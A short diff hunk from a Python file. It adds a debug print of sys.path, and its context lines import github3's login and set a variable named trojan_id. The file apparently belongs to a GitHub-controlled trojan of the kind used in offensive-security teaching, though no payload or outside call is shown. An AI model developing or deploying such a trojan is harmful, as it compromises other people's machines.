@@ -9,7 +9,7 @@ import queue
 import os
 import gc
 
-
+print(sys.path)
 from github3 import login
 
 trojan_id="abc"
